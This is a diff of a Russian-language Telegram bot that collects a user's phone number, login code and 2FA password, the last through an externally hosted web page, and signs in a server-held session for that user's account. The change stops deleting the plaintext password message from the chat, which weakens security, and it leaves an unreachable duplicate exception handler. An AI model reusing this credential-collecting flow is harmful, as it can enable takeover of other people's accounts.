@@ -445,28 +445,41 @@ async def password(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.message.web_app_data:
         data = json.loads(update.message.web_app_data.data)
         password_text = data.get("password", "").strip()
-
     else:
         password_text = update.message.text.strip()
-
-        try:
-            await update.message.delete()
-        except Exception:
-            pass
 
     client = context.user_data["client"]
 
     try:
         await client.sign_in(password=password_text)
+        password_text = None
 
+        return await finish_account(update, context)
+
+    except Exception:
         password_text = None
 
         await update.message.reply_text(
-            "✅ Аккаунт успешно подключен.",
-            reply_markup=menu
+            "❌ Неверный пароль 2FA.\n\n"
+            "Попробуй еще раз или нажми ❌ Отмена.",
+            reply_markup=ReplyKeyboardMarkup(
+                [
+                    [
+                        KeyboardButton(
+                            "🔐 Ввести 2FA пароль",
+                            web_app=WebAppInfo(
+                                url="https://story-tg-fbm0.onrender.com/webapp/2fa.html"
+                            )
+                        )
+                    ],
+                    ["❌ Отмена"]
+                ],
+                resize_keyboard=True,
+                one_time_keyboard=False
+            )
         )
 
-        return await finish_account(update, context)
+        return PASSWORD
 
     except Exception:
 
@@ -941,6 +954,8 @@ def main():
             PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, phone)],
             CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, code)],
             PASSWORD: [
+                MessageHandler(filters.Regex("^❌ Отмена$"), cancel),
+                CommandHandler("cancel", cancel),
                 MessageHandler(filters.StatusUpdate.WEB_APP_DATA, password),
                 MessageHandler(filters.TEXT & ~filters.COMMAND, password),
           ],
